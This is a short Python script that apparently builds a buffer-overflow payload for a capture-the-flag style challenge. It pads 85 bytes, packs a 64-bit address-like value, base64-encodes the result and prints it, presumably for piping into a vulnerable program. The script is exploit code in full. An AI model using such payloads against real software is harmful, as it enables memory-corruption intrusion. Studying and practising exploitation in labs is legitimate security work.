
import sys
import struct
import base64

buf = b'hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh'
buf += struct.pack('<Q', 304712000373626765)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
